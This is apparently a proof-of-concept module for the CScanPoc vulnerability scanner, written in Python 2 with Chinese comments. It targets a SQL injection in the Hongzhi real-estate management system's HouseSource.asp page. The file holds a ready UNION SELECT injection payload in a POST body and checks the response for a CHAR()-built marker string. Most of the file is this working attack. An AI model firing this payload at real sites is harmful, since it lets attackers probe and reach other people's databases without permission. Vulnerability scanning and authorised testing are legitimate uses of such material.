# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Hongzhi_0000' # 平台漏洞编号，留空
    name = '弘智科技房产管理系统SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-12-14'  # 漏洞公布时间
    desc = '''
        武汉弘智科技房产管理系统SQL注入漏洞。
        /pubinfo/HouseSource.asp?forsearch=1
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=075924
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '弘智房产管理系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'hongzhi_0000' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + '/pubinfo/HouseSource.asp?forsearch=1'
            post = 'xm_xzqy=&xm_xmmc=test%27union%20select%20NULL,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99),NULL,NULL,NULL,NULL--&xm_xmdz=&xm_kfs=&xm_fwhx=&xmcx.x=43&xmcx.y=13'
            code, head, res, err, _ = hh.http(url, post=post)
            if (code == 200) and ('WtFaBc' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()